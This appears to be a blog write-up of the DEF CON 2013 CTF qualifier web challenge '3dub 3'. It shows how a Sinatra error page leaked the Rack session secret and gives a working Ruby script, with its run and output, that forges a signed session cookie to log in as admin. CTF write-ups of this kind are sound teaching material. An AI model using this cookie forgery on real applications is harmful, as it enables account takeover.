---
title: DEF CON CTF Qualifier 2013 3dub 3 Writeup
author: xelz
layout: post
permalink: /def-con-ctf-qualifier-2013-3dub-3-writeup/
categories:
  - CTF
  - writeup
tags:
  - cookie
  - CTF
  - session
  - web
  - writeup
---
First of all, we got a &#8216;secrets&#8217; link and &#8216;log in or create user&#8217; form. When we create and login, the website redirect us to the &#8216;secrets&#8217; page like this

    Secrets
    name    owner   actions
    key admin   show
    nothing asdf    show
    new secret
    

we&#8217;ve got some links to see secrets owned by other users, include the &#8216;admin&#8217;, or easily add a new secret ourselves.

Having a try to open the [admin&#8217;s secret][1], we got a 500 Error Page with some error stack, which powered by the Ruby framework &#8216;Sinatra&#8217;.

From the very first sight of the page, it said &#8216;unauthorized&#8217; as the error message and a piece of source code was provided

    end
    
      redirect '/secrets'
    end
    
    get '/secrets/:id' do
      s = SECRETS[params[:id].to_i]
      raise "unauthorized" if session[:user_name] != s.username
    
      haml :secret, locals: {secret: s}
    end
    
    helpers do
      def current_user
        return nil unless session[:user_name]
    

It meant that I&#8217;m not she secret&#8217;s holder. then have a look at the whole page, and you would find some environment variable in the &#8216;Rack ENV&#8217; section, partly like

rack.session

`{"session_id"=>"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=>{"HTTP_USER_AGENT"=>"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=>"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=>"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=>"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=>"test"}`

rack.session.options

`{:path=>"/", :domain=>nil, :expire_after=>nil, :secure=>false, :httponly=>true, :defer=>false, :renew=>false, :sidbits=>128, :secure_random=>SecureRandom, :secret=>"wroashsoxDiculReejLykUssyifabEdGhovHabno", :coder=>#}`

rack.session.unpacked\_cookie\_data

`{"session_id"=>"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=>{"HTTP_USER_AGENT"=>"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=>"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=>"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=>"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=>"test"}`

rack.request.cookie_hash

`{"rack.session"=>"BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n--d637305e23d6693f3ebe276b292293c7ff0b72e6"}`

we&#8217;ve got some message:

the cookie `rack.session` is some way encoded of `rack.session.unpacked_cookie_data`, which is totally the same as env variable `rack.session`, and the coder mybe `Rack::Session::Cookie::Base64::Marshal`, secret (if any) maybe &#8216;wroashsoxDiculReejLykUssyifabEdGhovHabno&#8217;

By seeking the source code of rack, we found this(<https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb>)

    @secrets = options.values_at(:secret, :_old_secret).compact
    # some code else
    session_data = coder.encode(session)
    if @secrets.first
      session_data << "--#{generate_hmac(session_data, @secrets.first)}"
    end 
    # some code else
    def generate_hmac(data, secret)
      OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
    end
    

Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch

    if @secrets.size > 0 && session_data
        session_data, digest = session_data.split("--")
        session_data = nil unless digest_match?(session_data, digest)
    end
    

Meanwhile, we knew the whole process of the session checking. thus, I&#8217;ve wrote a ruby script to figure out this stuff with this way

*   unpack(decode) the cookie to origin session data
*   modify session\_data.user\_name to &#8216;admin&#8217;
*   repack(encode) the session data to cookie string format
*   calculate a new digest of the session data then build the cookie

codes below for example

    #!/usr/bin/ruby
    #Author: xelz@blue-lotus
    
    require 'openssl'
    
    # part of rack/lib/rack/session/cookie.rb
    class Base64
        def encode(str)
            [str].pack('m')
        end
    
        def decode(str)
            str.unpack('m').first
        end
    
        # Encode session cookies as Marshaled Base64 data
        class Marshal < Base64
            def encode(str)
                super(::Marshal.dump(str))
            end
    
            def decode(str)
                return unless str
                ::Marshal.load(super(str)) rescue nil
            end
        end
    end
    
    def generate_hmac(data, secret)
       OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
    end
    
    exit() unless ARGV[0]
    
    data = ARGV[0].split('--')[0]
    # puts 'data is:'
    # puts data, "\n"
    
    coder = Base64::Marshal.new
    data = coder.decode(data)
    data['user_name'] = "admin"
    data = coder.encode(data)
    # puts 'modified data is:'
    # puts data, "\n"
    data = data
    
    secret = 'wroashsoxDiculReejLykUssyifabEdGhovHabno'
    # puts 'new digest string is:'
    digest = generate_hmac(data, secret)
    # puts digest, "\n"
    
    puts 'cookie is'
    cookie = data.gsub("\n", "%0A") + '--' + digest
    puts cookie
    

run the script like this:

    xelz@blue-lotus:defconctf$echo -en 'BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n' | awk '{print $1"\\"}' | xargs ./hypeman.rb
    cookie is
    BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4=%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
    

then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I&#8217;d like to use the Javascript Console in Chrome:

    document.cookie='rack.session=xxx;'
    

refresh the page, and enjoy <img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /> 

> key
> 
> watch out for this Etdeksogav

 [1]: http://hypeman.shallweplayaga.me/secrets/0